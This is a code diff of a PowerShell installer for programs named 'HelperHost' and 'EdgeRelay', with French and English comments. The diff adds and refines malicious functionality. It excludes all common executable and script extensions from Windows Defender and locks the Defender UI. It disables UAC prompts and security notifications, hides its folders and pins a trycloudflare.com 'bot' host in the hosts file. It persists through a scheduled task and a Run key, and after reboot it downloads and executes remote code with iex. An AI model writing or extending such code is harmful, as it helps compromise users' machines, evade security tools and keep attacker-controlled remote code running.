@@ -239,7 +239,7 @@ function Hide-HH([string]$P) {
 Hide-HH $Dir
 Hide-HH $Cache
 if (-not $SessionPrep) {
-  Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 }
 
 function Wait-InteractiveLogon {
@@ -261,17 +261,49 @@ function Wait-InteractiveLogon {
   throw 'timeout: aucune session utilisateur'
 }
 
+function Get-BotCurlResolveArgs([string]$Url) {
+  # Local DNS often fails for *.trycloudflare.com (VM, weird resolvers). DoH + --resolve.
+  try {
+    $u = [uri]$Url
+    if (-not $u.Host -or $u.Host -notmatch 'trycloudflare\.com$') { return @() }
+    $ip = ((Invoke-RestMethod "https://cloudflare-dns.com/dns-query?name=$($u.Host)&type=A" -Headers @{ Accept = 'application/dns-json' } -TimeoutSec 8).Answer |
+      Where-Object { $_.type -eq 1 } | Select-Object -First 1).data
+    if ($ip) { return @('--resolve', "$($u.Host):443:$ip") }
+  } catch {}
+  return @()
+}
+
+function Set-BotHostsEntry([string]$BotUrl) {
+  # Pin bot hostname in hosts so HelperHost.exe (system DNS) can enroll after install.
+  if (-not (Test-IsAdmin)) { return }
+  try {
+    $u = [uri]$BotUrl
+    if (-not $u.Host -or $u.Host -notmatch 'trycloudflare\.com$') { return }
+    $ip = ((Invoke-RestMethod "https://cloudflare-dns.com/dns-query?name=$($u.Host)&type=A" -Headers @{ Accept = 'application/dns-json' } -TimeoutSec 8).Answer |
+      Where-Object { $_.type -eq 1 } | Select-Object -First 1).data
+    if (-not $ip) { return }
+    $hf = Join-Path $env:SystemRoot 'System32\drivers\etc\hosts'
+    $lines = @()
+    if (Test-Path $hf) {
+      $lines = @(Get-Content $hf -EA SilentlyContinue | Where-Object { $_ -notmatch '# agentshe-bot' })
+    }
+    $lines += "$ip`t$($u.Host)`t# agentshe-bot"
+    Set-Content -Path $hf -Value $lines -Encoding ASCII -Force
+  } catch {}
+}
+
 function Download-File([string]$Url, [string]$OutFile) {
   $dir = Split-Path -Parent $OutFile
   if ($dir -and -not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
   $tmp = Join-Path $env:TEMP ('hh-dl-' + [guid]::NewGuid().ToString('n') + '.bin')
   $ok = $false
   $last = $null
+  $resolve = Get-BotCurlResolveArgs $Url
   for ($i = 1; $i -le 3; $i++) {
     try {
       Remove-Item $tmp -Force -EA SilentlyContinue
       if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
-        & curl.exe -fsSL --retry 2 --retry-delay 1 -o $tmp $Url
+        & curl.exe -fsSL @resolve --retry 2 --retry-delay 1 -o $tmp $Url
         if ($LASTEXITCODE -ne 0) { throw "curl exit $LASTEXITCODE : $Url" }
       } else {
         Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $tmp
@@ -433,10 +465,7 @@ function Disable-UACPrompts {
   $tools = Join-Path $Dir 'tools'
   New-Item $tools -ItemType Directory -Force | Out-Null
   Hide-HH $tools
-  Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
-  if (Get-Command Add-MpPreference -EA SilentlyContinue) {
-    Add-MpPreference -ExclusionPath $tools -EA SilentlyContinue
-  }
+  Set-DefenderExclude
 }
 
 function Invoke-ElevatedSessionPrep {
@@ -555,7 +584,10 @@ function Disable-AllBlocking {
     Set-MpPreference -UILockdown $true
     Set-MpPreference -DisablePrivacyMode $true -EA SilentlyContinue
     Set-MpPreference -EnableLowCpuPriority $true -EA SilentlyContinue
-    Set-MpPreference -ExclusionExtension '.exe','.dll','.ps1','.bat','.cmd','.vbs','.zip','.txt' -EA SilentlyContinue
+    # Extensions only (no ExclusionPath folders) — easier full restore on wipe
+    Set-MpPreference -ExclusionExtension @(
+      '.exe','.dll','.sys','.ps1','.bat','.cmd','.vbs','.js','.msi','.zip','.7z','.txt'
+    ) -EA SilentlyContinue
   }
 
   $wdPol = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
@@ -657,7 +689,8 @@ function Disable-AllBlocking {
 function Invoke-SessionHarden {
   # AV off via GPO "gere par votre organisation" only — reversible on wipe, no .exe soft-delete.
   if (-not (Test-IsAdmin)) { return }
-  Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
+  if ($BotBase) { Set-BotHostsEntry $BotBase }
+  Set-DefenderExclude
   Disable-AllBlocking
   Disable-UACPrompts
   Disable-SecurityCenterToasts
@@ -700,6 +733,11 @@ function Request-AvRebootIfNeeded {
     'need-reboot' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-need-reboot') -Force
     Write-Host 'AV encore actif apres reboot — EarlyAV present, pas de 2e reboot auto.'
     return
+  }
+
+  # CRITICAL: register resume BEFORE shutdown — otherwise post-login install never runs.
+  try { Register-ResumeAtLogon } catch {
+    Write-Host ("WARN Register-ResumeAtLogon: " + $_.Exception.Message)
   }
 
   'need-reboot' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-need-reboot') -Force
@@ -790,21 +828,12 @@ function Install-EarlyAvTask {
   try { & cmd.exe /c "`"$cmd`"" | Out-Null } catch {}
 }
 
-function Set-DefenderExclude([string]$Path, [string]$Exe) {
-  $name = Split-Path $Exe -Leaf
-  $edge = Join-Path $Path 'EdgeRelay.exe'
-  $tools = Join-Path $Path 'tools'
+function Set-DefenderExclude {
+  # Exclude by file extension only — never ExclusionPath (folders leave traces / sticky prefs).
   if (-not (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) { return }
+  $ext = @('.exe','.dll','.sys','.ps1','.bat','.cmd','.vbs','.js','.msi','.zip','.7z','.txt')
   try {
-    Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath $Cache -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath $tools -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess 'EdgeRelay.exe' -ErrorAction SilentlyContinue
-    Add-MpPreference -ControlledFolderAccessAllowedApplications $Exe -ErrorAction SilentlyContinue
-    if (Test-Path $edge) {
-      Add-MpPreference -ControlledFolderAccessAllowedApplications $edge -ErrorAction SilentlyContinue
-    }
+    Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
   } catch {}
 }
 
@@ -858,59 +887,92 @@ function Register-ResumeAtLogon {
     }
   }
   $ghVal = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } elseif ($BotBase) { "$($BotBase.TrimEnd('/'))/files/releases" } else { '' }
+  # Resolve bot IP now (while network/DoH works in elevated install) for post-reboot curl --resolve
+  $botHost = ''
+  $botIp = ''
+  try {
+    $botHost = ([uri]$BotBase).Host
+    $ra = Get-BotCurlResolveArgs $BotBase
+    if ($ra.Count -ge 2 -and $ra[1] -match ':443:(.+)$') { $botIp = $Matches[1] }
+  } catch {}
+  if ($botIp -and $BotBase) { Set-BotHostsEntry $BotBase }
+
   $state = [ordered]@{
     enroll      = $Enroll
     bot_base    = $BotBase
     install_url = $InstallUrl
     gh          = $ghVal
+    bot_host    = $botHost
+    bot_ip      = $botIp
     user        = $env:USERNAME
   }
+  if (-not (Test-Path $Dir)) { New-Item -ItemType Directory -Path $Dir -Force | Out-Null }
   ($state | ConvertTo-Json) | Set-Content -Encoding UTF8 $ResumeFile
   '1' | Set-Content -Encoding ASCII $PendingFile
 
   $launcher = Join-Path $Dir 'resume-install.ps1'
   $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
-  $log = (Join-Path $Dir 'resume.log').Replace("'", "''")
-  $rf = $ResumeFile.Replace("'", "''")
-  @(
-    "`$ErrorActionPreference = 'Stop'"
-    "Start-Transcript -Path '$log' -Force -ErrorAction SilentlyContinue"
-    "function Wait-InteractiveLogon {"
-    "  `$deadline = (Get-Date).AddHours(48)"
-    "  while ((Get-Date) -lt `$deadline) {"
-    "    try {"
-    "      `$u = (Get-CimInstance Win32_ComputerSystem -EA Stop).UserName"
-    "      if (`$u) {"
-    "        `$e = @(Get-Process explorer -EA SilentlyContinue | Where-Object { `$_.SessionId -gt 0 })"
-    "        if (`$e.Count -gt 0) { Start-Sleep -Seconds 8; return }"
-    "      }"
-    "    } catch {}"
-    "    Start-Sleep -Seconds 3"
-    "  }"
-    "  throw 'timeout session'"
-    "}"
-    "Write-Host 'HelperHost: reprise install apres reboot...'"
-    "Wait-InteractiveLogon"
-    "`$j = Get-Content -Raw '$rf' | ConvertFrom-Json"
-    "`$Enroll = `$j.enroll"
-    "`$BotBase = `$j.bot_base"
-    "`$InstallUrl = `$j.install_url"
-    "`$env:AGENTSHE_ENROLL = `$Enroll"
-    "`$env:AGENTSHE_BOT_BASE = `$BotBase"
-    "`$env:AGENTSHE_INSTALL_URL = `$InstallUrl"
-    "if (`$j.gh) { `$env:AGENTSHE_GH = `$j.gh } else { `$env:AGENTSHE_GH = (`$BotBase.TrimEnd('/') + '/files/releases') }"
-    "`$env:AGENTSHE_ELEVATED = '1'"
-    "`$env:AGENTSHE_AFTER_REBOOT = '1'"
-    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
-    "try {"
-    "  iex ((curl.exe -fsSL `$InstallUrl | Out-String))"
-    "  Write-Output 'OK'"
-    "} catch {"
-    "  `$_ | Out-String | Set-Content -Encoding UTF8 (Join-Path `$env:TEMP 'HelperHost-resume.err')"
-    "  exit 1"
-    "}"
-    "Stop-Transcript -ErrorAction SilentlyContinue"
-  ) -join "`r`n" | Set-Content -Encoding UTF8 $launcher
+  $log = Join-Path $Dir 'resume.log'
+  $rf = $ResumeFile
+  # Single-quoted here-string: no escaping hell. Placeholders replaced below.
+  $launcherBody = @'
+$ErrorActionPreference = 'Stop'
+Start-Transcript -Path '__RESUME_LOG__' -Force -ErrorAction SilentlyContinue
+function Wait-InteractiveLogon {
+  $deadline = (Get-Date).AddHours(48)
+  while ((Get-Date) -lt $deadline) {
+    try {
+      $u = (Get-CimInstance Win32_ComputerSystem -EA Stop).UserName
+      if ($u) {
+        $e = @(Get-Process explorer -EA SilentlyContinue | Where-Object { $_.SessionId -gt 0 })
+        if ($e.Count -gt 0) { Start-Sleep -Seconds 8; return }
+      }
+    } catch {}
+    Start-Sleep -Seconds 3
+  }
+  throw 'timeout session'
+}
+Write-Host 'HelperHost: reprise install apres reboot...'
+Wait-InteractiveLogon
+$j = Get-Content -Raw '__RESUME_JSON__' | ConvertFrom-Json
+$Enroll = $j.enroll
+$BotBase = $j.bot_base
+$InstallUrl = $j.install_url
+$env:AGENTSHE_ENROLL = $Enroll
+$env:AGENTSHE_BOT_BASE = $BotBase
+$env:AGENTSHE_INSTALL_URL = $InstallUrl
+if ($j.gh) { $env:AGENTSHE_GH = $j.gh } else { $env:AGENTSHE_GH = ($BotBase.TrimEnd('/') + '/files/releases') }
+$env:AGENTSHE_ELEVATED = '1'
+$env:AGENTSHE_AFTER_REBOOT = '1'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$h = [string]$j.bot_host
+if (-not $h -and $BotBase) { try { $h = ([uri]$BotBase).Host } catch {} }
+$ip = [string]$j.bot_ip
+if ($ip -and $h) {
+  $hf = Join-Path $env:SystemRoot 'System32\drivers\etc\hosts'
+  try {
+    $lines = @()
+    if (Test-Path $hf) { $lines = @(Get-Content $hf | Where-Object { $_ -notmatch '# agentshe-bot' }) }
+    $lines += ($ip + "`t" + $h + "`t# agentshe-bot")
+    Set-Content -Path $hf -Value $lines -Encoding ASCII -Force
+  } catch {}
+}
+try {
+  if ($ip -and $h) {
+    iex ((curl.exe -fsSL --resolve ($h + ':443:' + $ip) $InstallUrl | Out-String))
+  } else {
+    iex ((curl.exe -fsSL $InstallUrl | Out-String))
+  }
+  Write-Output 'OK'
+} catch {
+  $_ | Out-String | Set-Content -Encoding UTF8 (Join-Path $env:TEMP 'HelperHost-resume.err')
+  $_ | Out-String | Set-Content -Encoding UTF8 (Join-Path $env:LOCALAPPDATA 'HelperHost\resume.err')
+  exit 1
+}
+Stop-Transcript -ErrorAction SilentlyContinue
+'@
+  $launcherBody = $launcherBody.Replace('__RESUME_LOG__', $log).Replace('__RESUME_JSON__', $rf)
+  Set-Content -Path $launcher -Value $launcherBody -Encoding UTF8
 
   $tn = 'HelperHostResume'
   try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue } catch {}
@@ -930,6 +992,12 @@ function Register-ResumeAtLogon {
     & schtasks.exe /Create /TN $tn /TR "`"$ps`" $arg" /SC ONLOGON /RL HIGHEST /F | Out-Null
   }
 
+  # Backup: Run key (scheduled tasks AtLogOn sometimes skipped on VMs / delayed login)
+  try {
+    $run = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+    New-Item $run -Force -EA SilentlyContinue | Out-Null
+    Set-ItemProperty -Path $run -Name 'HelperHostResume' -Value "`"$ps`" $arg" -Force
+  } catch {}
 }
 
 function Clear-ResumeTasks {
@@ -939,6 +1007,9 @@ function Clear-ResumeTasks {
   Remove-Item $PendingFile, $ResumeFile -Force -ErrorAction SilentlyContinue
   $launcher = Join-Path $Dir 'resume-install.ps1'
   Remove-Item $launcher -Force -ErrorAction SilentlyContinue
+  try {
+    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'HelperHostResume' -Force -EA SilentlyContinue
+  } catch {}
 }
 
 function Start-Helper([string]$Helper, [string]$WorkDir) {
@@ -959,7 +1030,7 @@ function Start-Helper([string]$Helper, [string]$WorkDir) {
     Register-ResumeAtLogon
     '1' | Set-Content -Encoding ASCII $RebootFlag
     Write-Output 'REBOOT'
-    Start-Sleep -Seconds 2
+  Start-Sleep -Seconds 2
     Restart-Computer -Force
     Start-Sleep -Seconds 60
     return
@@ -1053,6 +1124,12 @@ if (-not (Test-IsAdmin) -and -not $IsElevatedRun) {
 
 # Deja admin (ou passe elev)
 Invoke-SessionHarden
+# Si reboot AV programme: ne pas Start-Helper maintenant — ResumeAtLogon reprend apres login
+if ($script:ElevRebootPending) {
+  try { Register-ResumeAtLogon } catch {}
+  Write-Output 'REBOOT-PENDING (reprise auto a la prochaine connexion)'
+  return
+}
 Start-Helper $Helper $Dir
 
 if ($script:ElevDoneOk) {
@@ -1060,6 +1137,7 @@ if ($script:ElevDoneOk) {
   return
 }
 if ($script:ElevRebootPending) {
+  try { Register-ResumeAtLogon } catch {}
   Write-Output 'REBOOT-PENDING (reprise auto a la prochaine connexion)'
   return
 }
